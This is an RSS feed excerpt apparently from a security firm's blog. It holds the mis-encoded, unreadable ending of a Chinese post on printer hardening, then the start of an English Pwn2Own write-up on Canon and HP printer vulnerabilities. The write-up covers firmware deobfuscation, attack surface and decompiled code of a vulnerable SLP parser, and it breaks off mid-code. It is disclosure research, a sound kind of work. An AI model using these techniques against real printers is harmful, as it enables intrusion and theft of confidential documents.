&lt;p&gt;é¦–å…ˆå°±æ˜¯å®šæœŸæ›´æ–°ï¼Œä¸Šè¿°çš„å°è¡¨æ©Ÿéƒ½å·²æœ‰ patchï¼Œé€™é‚Šæ˜¯å¾ˆå¸¸è¢«å¤§å®¶å¿½ç•¥çš„ä¸€éƒ¨åˆ†ï¼Œæˆ‘å€‘å¾ˆå¸¸çœ‹åˆ°å°è¡¨æ©Ÿå¥½å¹¾å¹´äº†éƒ½æ²’æ›´æ–°ï¼Œç”šè‡³ç›´æ¥é è¨­å¯†ç¢¼æ”¾è‘—ï¼Œå¾ˆå®¹æ˜“å°±è¢«ç•¶æˆç›®æ¨™ã€‚&lt;/p&gt;

&lt;h3 id=&quot;disable-unused-service&quot;&gt;Disable unused service&lt;/h3&gt;

&lt;p&gt;å¦å¤–ä¸€é»å°±æ˜¯ç›¡å¯èƒ½é—œæ‰æ²’åœ¨ç”¨çš„æœå‹™ï¼Œ å¤§éƒ¨åˆ†çš„å°è¡¨æ©Ÿé è¨­é–‹å•Ÿéå¤šå¹³å¸¸æ ¹æœ¬ä¸æœƒç”¨çš„æœå‹™ï¼Œæˆ‘å€‘ç”šè‡³èªç‚ºå¯ä»¥é—œæ‰ discovery æœå‹™ï¼Œåªè¦é–‹ä½ è¦ç”¨çš„å°±å¥½äº†ã€‚&lt;/p&gt;

&lt;h3 id=&quot;firewall&quot;&gt;Firewall&lt;/h3&gt;
&lt;p&gt;æ›´å¥½çš„åšæ³•å¯ä»¥å†åŠ ä¸Š firewallï¼Œå¤§éƒ¨åˆ†å°è¡¨æ©Ÿä¹Ÿéƒ½æœ‰æä¾›ç›¸é—œåŠŸèƒ½ã€‚&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
&lt;p&gt;äº‹å¯¦ä¸Šï¼Œæˆ‘å€‘ç²å¾— shellcode åŸ·è¡Œå¾Œï¼Œé™¤äº†å°æ±è¥¿åœ¨ LCD å¤–ï¼Œæˆ‘å€‘å¯ä»¥è—‰ç”±å°è¡¨æ©Ÿä¾†ç«Šå–æ©Ÿå¯†è³‡è¨Šï¼Œä¸è«–æ˜¯æ©Ÿå¯†æ–‡ä»¶æˆ–æ˜¯ä¸€äº› credentialï¼Œå°è¡¨æ©Ÿä¹Ÿæ˜¯å€‹å¹³è¡Œç§»å‹• (Lateral Movement) çš„é»ï¼Œè€Œä¸”å¾ˆé›£è¢«åµæ¸¬åˆ°ï¼Œæ˜¯ç´…éšŠä¸­éå¸¸å¥½çš„ç›®æ¨™ã€‚å¦å¤–å¾ˆå¤šå°è¡¨æ©Ÿä¸Šçš„ç™¼ç¾æœå‹™ç³»åˆ—çš„å”å®šæˆ–æ˜¯ DNS ç³»åˆ—çš„å”å®šå¾ˆå¸¸å‡ºå•é¡Œï¼Œå¦‚æœæƒ³æ‰¾é¡ä¼¼å°è¡¨æ©Ÿæˆ–å…¶ä»– IoT è¨­å‚™çš„æ¼æ´ï¼Œä¹Ÿè¨±å¯ä»¥å„ªå…ˆæœé€™å€‹æ–¹å‘çœ‹çœ‹ã€‚&lt;/p&gt;

&lt;h2 id=&quot;to-be-continue&quot;&gt;To be continue&lt;/h2&gt;
&lt;p&gt;æœ€å¾Œï¼Œæˆ‘å€‘åœ¨å»å¹´ &lt;a href=&quot;https://www.thezdi.com/blog/2022/8/29/announcing-pwn2own-toronto-2022-and-introducing-the-soho-smashup&quot;&gt;Pwn2Own Toronto 2022&lt;/a&gt; ä¸­ï¼Œä¹Ÿåœ¨å°è¡¨æ©Ÿç³»åˆ—ä¸­æ‰¾åˆ°å¹¾å€‹æ¼æ´ï¼Œæˆ‘å€‘ä¹Ÿå°‡æœƒåœ¨è¿‘æœŸç™¼ä½ˆè©³ç´°è³‡è¨Šï¼Œæ•¬è«‹æœŸå¾… Part II&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://labs.withsecure.com/assets/BlogFiles/Printing-Shellz.pdf&quot;&gt;https://labs.withsecure.com/assets/BlogFiles/Printing-Shellz.pdf&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://foxglovesecurity.com/2017/11/20/a-sheep-in-wolfs-clothing-finding-rce-in-hps-printer-fleet/&quot;&gt;https://foxglovesecurity.com/2017/11/20/a-sheep-in-wolfs-clothing-finding-rce-in-hps-printer-fleet/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://research.checkpoint.com/2018/sending-fax-back-to-the-dark-ages/&quot;&gt;https://research.checkpoint.com/2018/sending-fax-back-to-the-dark-ages/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1/</link>
                <guid>https://devco.re/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1</guid>
                <pubDate>Thu, 05 Oct 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Your printer is not your printer ! - Hacking Printers at Pwn2Own Part I</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Printer has become one of the essential devices in the corporate intranet in the past few years, and its functionalities have also increased significantly. Not only printing or faxing, cloud printing services like AirPrint are also supported to make it easier to use. Direct printing from mobile devices is now a basic requirement in the IoT era. We also use it to print some internal business documents of the company, which makes it even more important to keep the printer secure.&lt;/p&gt;

&lt;p&gt;In 2021, we found Pre-auth RCE vulnerabilities(&lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-22-515/&quot;&gt;CVE-2022-24673&lt;/a&gt; and &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-22-532/&quot;&gt;CVE-2022-3942&lt;/a&gt;) in Canon and HP printers, and vulnerability(&lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-22-332/&quot;&gt;CVE-2021-44734&lt;/a&gt;) in Lexmark. We used these vulnerabilities to exploit Canon ImageCLASS MF644Cdw, HP Color LaserJet Pro MFP M283fdw and Lexmark MC3224i in &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/11/1/pwn2ownaustin&quot;&gt;Pwn2Own Austin 2021&lt;/a&gt;. Following we will describe the details of the Canon and HP vulnerabilities and exploitation.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This research is also presented at &lt;a href=&quot;https://hitcon.org/2022/agenda/704bf58c-c42b-4593-97c0-9aba91caa6e4&quot;&gt;HITCON 2022&lt;/a&gt; and &lt;a href=&quot;https://codeblue.jp/2022/en/talks/&quot;&gt;CODE BLUE 2022&lt;/a&gt;. You can check the &lt;a href=&quot;https://hitcon.org/2022/slides/Your%20Printer%20is%20not%20your%20Printer%20!%20-%20Hacking%20Printers%20at%20Pwn2Own.pdf&quot;&gt;slides&lt;/a&gt; here.&lt;/p&gt;

&lt;h2 id=&quot;printer&quot;&gt;Printer&lt;/h2&gt;
&lt;p&gt;In the early days, it often required an IEEE1284 or USB Printer cable to connect the printer to the computer. We also had to install the printer driver provided by the manufacturer. Nowadays, most of the printers on the market do not require USB or traditional cable. As long as the printer is connected to the intranet through a LAN cable, we can find and utilize the printer immediately.&lt;/p&gt;

&lt;p&gt;Printer also provides not only printing but also various services such as FTP, AirPrint, Bonjour. Nothing more than to make printing more convenient.&lt;/p&gt;

&lt;h2 id=&quot;motivation&quot;&gt;Motivation&lt;/h2&gt;

&lt;h3 id=&quot;why-do-we-want-to-research-printers-&quot;&gt;Why do we want to research Printers ?&lt;/h3&gt;

&lt;h4 id=&quot;red-team&quot;&gt;Red Team&lt;/h4&gt;
&lt;p&gt;While doing red team assessment, we found that printers generally appeared in the corporate intranet. There are almost always more than one, but they are usually overlooked and lack of update. It is also an excellent target for red team to hide the action because it is often difficult to detect. It is worth mentioning that larger enterprises are also likely to connect them to AD and become the entry point for confidential information.&lt;/p&gt;

&lt;h4 id=&quot;pwn2own-austin-2021&quot;&gt;Pwn2Own Austin 2021&lt;/h4&gt;
&lt;p&gt;Another reason is that printers have become one of the main targets of Pwn2Own Mobile. We were also preparing to participate the Pwn2Own stage again, so we decided to start with it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At first, we thought they were trivial. Like most IoT devices, there are often many command injection vulnerabilities. However, many printers use RTOS instead of Linux systems, which drove our determination to challenge it.&lt;/p&gt;

&lt;p&gt;This article will focus on the Canon and HP parts.&lt;/p&gt;

&lt;h2 id=&quot;analysis&quot;&gt;Analysis&lt;/h2&gt;
&lt;p&gt;In the beginning, we read many &lt;a href=&quot;https://chdk.fandom.com/wiki/DryOS_PIXMA_Printer_Shell&quot;&gt;articles&lt;/a&gt;, all of them need to tear down the hardware for analysis and obtaining the debug console. Then they use the memory dumping method to obtain the original firmware. But in the end, we chose another way and didnâ€™t tear down any of the printers.&lt;/p&gt;

&lt;h3 id=&quot;canon&quot;&gt;Canon&lt;/h3&gt;

&lt;h4 id=&quot;firmware-extract&quot;&gt;Firmware Extract&lt;/h4&gt;
&lt;p&gt;The initial analysis version is v6.03, we used binwalk to analyze it at the beginning, but the firmware is obfuscated, we canâ€™t analyze it directly.&lt;/p&gt;

&lt;p&gt;Obfuscated Canon ImageCLASS MF644Cdw firmware
&lt;img src=&quot;/assets/img/blog/20231005/3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We also tried &lt;a href=&quot;https://www.synacktiv.com/publications/treasure-chest-party-quest-from-doom-to-exploit.html&quot;&gt;â€œTREASURE CHEST PARTY QUEST: FROM DOOM TO EXPLOITâ€&lt;/a&gt; by Synacktiv and &lt;a href=&quot;https://web.archive.org/web/20220224100459/https://www.contextis.com/en/blog/hacking-canon-pixma-printers-doomed-encryption&quot;&gt;â€œHacking Canon Pixma PrintersÂ â€“Â Doomed Encryptionâ€&lt;/a&gt; by Contextis research. But this time, itâ€™s an entirely different series, and we canâ€™t use the same method to deobfuscate the firmware.&lt;/p&gt;

&lt;p&gt;So we started to analyze the obfuscated firmware format and content.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see from the obfuscated firmware that the beginning is the Magic NCFW, followed by the size of the firmware, and other parts are obfuscated data.&lt;/p&gt;

&lt;p&gt;So we started to think that maybe the old firmware of this printer is not obfuscated until a specific version. If we can get the intermediate version, maybe there is a chance to get the deobfuscation method. The magic header also lets us distinguish whether it is obfuscated.&lt;/p&gt;

&lt;p&gt;We can obtain the firmware download URL through the official website or the update packet.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://pdisp01.c-wss.com/gdl/WWUFORedirectTarget.do?id=MDQwMDAwNDc1MjA1&amp;amp;cmp=Z01&amp;amp;lang=EN
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After analysis, it can be split into three parts.
&lt;img src=&quot;/assets/img/blog/20231005/5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ï¼·e can roughly infer the rules of the download URL. We use this method to download all versions of firmware. The versions we downloaded at that time included:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;V2.01&lt;/li&gt;
  &lt;li&gt;V4.02&lt;/li&gt;
  &lt;li&gt;V6.03&lt;/li&gt;
  &lt;li&gt;V9.03&lt;/li&gt;
  &lt;li&gt;V10.02&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;V10.02 is a version that will be released in a few weeks, and you can download it from here first. After downloading all versions, we found that the firmware for this series is obfuscated, and there is no way to deobfuscate it from the previous version.&lt;/p&gt;

&lt;p&gt;But we can try downloading Canonâ€™s other series firmware and find out if there is a similar obfuscation algorithm. After all the firmware is downloaded, the total file size is 130 GB. We can find unobfuscated firmware by grepping for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NCFW&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;servicemode.html&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/6.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, we found four firmware that meets the conditions. We chose WG7000 series printers to analyze and found the suspected deobfuscation function.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Fortunately, by rewriting this function, the MF644Cdw firmware can be deobfuscated.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/8.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After the firmware is extracted, we needed the image base address so that IDA can effectively identify and reference the strings. At first, we find the image base through the common analysis tool &lt;a href=&quot;https://github.com/sgayou/rbasefind&quot;&gt;rbasefind&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/9.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The first base we found was 0x40b0000. But after decompiled it with IDA, most of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;function&lt;/code&gt; did not correspond to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;debug message&lt;/code&gt; string.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/10.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown in the figure above, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loc_4489AC08&lt;/code&gt; should point to the string of the function name, but this address is not a regular string. Instead, it is recognized as a code section, and the content is not a string. This indicates that this location is not an actual address. We thought there was a slight offset, but it did not cause big problem for decompiling functions.&lt;/p&gt;

&lt;p&gt;How to solve this problem? We first found a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;function with a known function name&lt;/code&gt; and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;function name string&lt;/code&gt; belonging to it to make adjustments. After finding the offset, we adjusted the image base to the correct address. The final image base found is &lt;strong&gt;0x40affde0&lt;/strong&gt;. After adjustment, you can see that the original function name can be identified correctly.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/11.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, we can analyze the firmware typically. After preliminary analysis, we can find out the of Canon ImageCLASS MF644Cdw:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;OS - DryOSV2
    &lt;ul&gt;
      &lt;li&gt;Customized RTOS by Canon&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ARMv7 32bit little-endian&lt;/li&gt;
  &lt;li&gt;Linked with application code into single image
    &lt;ul&gt;
      &lt;li&gt;Kernel&lt;/li&gt;
      &lt;li&gt;Service&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;hp&quot;&gt;HP&lt;/h3&gt;
&lt;p&gt;HPâ€™s firmware is relatively easy to obtain. We can use &lt;a href=&quot;https://github.com/fkie-cad/fact_extractor/issues/37&quot;&gt;binwalk -Z&lt;/a&gt; to obtain the correct firmware. It took about 3-4 days. The other steps, such as finding the image base address, are just the same as Canon. After preliminary analysis, the architecture of HP Color LaserJet Pro MFP M283fdw is as follows:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;OS
    &lt;ul&gt;
      &lt;li&gt;RTOS - Modify from ThreadX/Green Hills&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ARM11 Mixed-endian
    &lt;ul&gt;
      &lt;li&gt;Code - little-endian&lt;/li&gt;
      &lt;li&gt;Data - Big-endian&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;attack-surface&quot;&gt;Attack Surface&lt;/h2&gt;
&lt;p&gt;Many services are enabled by default in most printers on the market today.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;RUI&lt;/td&gt;
      &lt;td&gt;TCP 80/443&lt;/td&gt;
      &lt;td&gt;Web interface&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;PDL&lt;/td&gt;
      &lt;td&gt;TCP 9100&lt;/td&gt;
      &lt;td&gt;Page Description Language&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;PJL&lt;/td&gt;
      &lt;td&gt;TCP 9100&lt;/td&gt;
      &lt;td&gt;Printer Job Language&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;IPP&lt;/td&gt;
      &lt;td&gt;TCP 631&lt;/td&gt;
      &lt;td&gt;Internet Printing Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;LPD&lt;/td&gt;
      &lt;td&gt;TCP 515&lt;/td&gt;
      &lt;td&gt;Line Printer Daemon Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;SNMP&lt;/td&gt;
      &lt;td&gt;UDP 161&lt;/td&gt;
      &lt;td&gt;Simple Network Management Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;SLP&lt;/td&gt;
      &lt;td&gt;TCP 427&lt;/td&gt;
      &lt;td&gt;Service Location Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;mDNS&lt;/td&gt;
      &lt;td&gt;UDP 5353&lt;/td&gt;
      &lt;td&gt;Multicast DNS&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;LLMNR&lt;/td&gt;
      &lt;td&gt;UDP 5355&lt;/td&gt;
      &lt;td&gt;Link-Local Multicast Name Resolution&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;â€¦&lt;/td&gt;
      &lt;td&gt;â€¦&lt;/td&gt;
      &lt;td&gt;â€¦&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Usually, RUI (web interface) is opened for facilitate management. The 9100 Port is also commonly used by printers, mainly used to transmit printed data.&lt;/p&gt;

&lt;p&gt;Others vary between vendors, but the listed ones are usually present, and most are enabled by default. After evaluating the overall architecture, we focus on service discovery and the DNS series of services. Our long-term experience has often observed that such protocols implemented by manufacturers are often prone to vulnerabilities. The primary services we analyzed were &lt;strong&gt;SLP&lt;/strong&gt;, &lt;strong&gt;mDNS&lt;/strong&gt;, and &lt;strong&gt;LLMNR&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Next, we take Pwn2Own Austin 2021 as a case study to see what problems these protocols often have.&lt;/p&gt;

&lt;h2 id=&quot;hacking-printers-at-pwn2own&quot;&gt;Hacking printers at Pwn2Own&lt;/h2&gt;

&lt;h3 id=&quot;canon-1&quot;&gt;Canon&lt;/h3&gt;

&lt;h4 id=&quot;service-location-protocol&quot;&gt;Service Location Protocol&lt;/h4&gt;
&lt;p&gt;SLP is a service discovery protocol that allows computers and other devices to find services in local area network. In the past, there were many &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/3/1/cve-2020-3992-amp-cve-2021-21974-pre-auth-remote-code-execution-in-vmware-esxi&quot;&gt;vulnerabilities&lt;/a&gt; in EXSIâ€™s SLP. Canon implements the SLP service mainly by themselves. For details about SLP service, please refer to &lt;a href=&quot;https://www.ietf.org/rfc/rfc2608.txt&quot;&gt;RFC2608&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Before we look into the detail of SLP, we need to talk about the structure of SLP packets.&lt;/p&gt;

&lt;p&gt;SLP Packet Structure
&lt;img src=&quot;/assets/img/blog/20231005/12.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we only need to pay attention to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;function-id&lt;/code&gt;. This field determines the request type and the format of the payload part. Canon only implements Service Request and Attribute Request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/13.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the Attribute Request (AttrRqst), the user can obtain the attribute list according to the service and scope. We can specify a scope to look for, such as Canon printers.&lt;/p&gt;

&lt;p&gt;Example:
&lt;img src=&quot;/assets/img/blog/20231005/14.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The Attribute Request structure is as follows
&lt;img src=&quot;/assets/img/blog/20231005/15.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It mainly comprises length (Length) and value (Value). Parsing this kind of format should be careful because there are often bugs here. 
In fact, there is a vulnerability in Canon when paring this format.&lt;/p&gt;

&lt;h4 id=&quot;vulnerability&quot;&gt;Vulnerability&lt;/h4&gt;
&lt;p&gt;When it parses the scope list, it converts escape characters to ASCII. For example, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\41&lt;/code&gt; will be converted to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt;.  But whatâ€™s wrong with this simple transformation? Letâ€™s take a look at the pseudocode.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parse_scope_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(...){&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;parse_escape_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(...,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As shown in the above code, in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parse_scope_list&lt;/code&gt;, it passes a fixed size buffer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;destbuf&lt;/code&gt; and the maximum size 34 to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parse_escape_char&lt;/code&gt;. No vulnerability here.  Letâ€™s take a look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parse_escape_char&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parse_escape_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdatalen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r7&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r9&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r8&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r11&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r6&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// cc&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// cc&lt;/span&gt;
